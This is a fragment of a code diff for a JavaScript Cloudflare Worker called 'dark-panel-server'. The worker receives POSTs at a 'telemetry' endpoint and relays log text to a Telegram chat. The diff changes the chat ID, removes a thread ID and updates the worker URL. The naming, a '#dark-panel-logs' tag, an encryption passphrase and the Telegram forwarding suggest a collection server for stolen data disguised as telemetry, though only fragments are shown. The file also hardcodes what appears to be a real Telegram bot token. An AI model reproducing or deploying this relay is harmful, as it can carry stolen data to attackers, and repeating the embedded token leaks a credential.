@@ -20,8 +20,7 @@
 
 // ─── Telegram credentials ─────────────────────────────────────
 const BOT_TOKEN         = '8814853350:AAEpp6FjACzCOj8h6CH8ivNMMbUwobtbnqM';
-const CHAT_ID           = '-1004291828596';
-const MESSAGE_THREAD_ID = 3;
+const CHAT_ID           = '-1004313911336';
 
 // ─── AES-256-GCM master passphrase ───────────────────────────
 // PBKDF2 derives a unique 256-bit key from this + a random salt
@@ -253,7 +252,7 @@ export default {
         }
 
         if (url.pathname !== '/api/v1/telemetry') {
-            return json({ error: 'Endpoint not found', docs: 'https://dark-panel-server.workers.dev/api/v1/status' }, 404);
+            return json({ error: 'Endpoint not found', docs: 'https://dark-panel-server.ramguota7.workers.dev/api/v1/status' }, 404);
         }
 
         if (request.method !== 'POST') {
@@ -371,7 +370,6 @@ ${ce(EMOJI.love,'❤️')} <i>#dark-panel-logs</i>`;
                     headers: { 'content-type': 'application/json' },
                     body:    JSON.stringify({
                         chat_id:                  CHAT_ID,
-                        message_thread_id:        MESSAGE_THREAD_ID,
                         text:                     logText,
                         parse_mode:               'HTML',
                         disable_web_page_preview: true
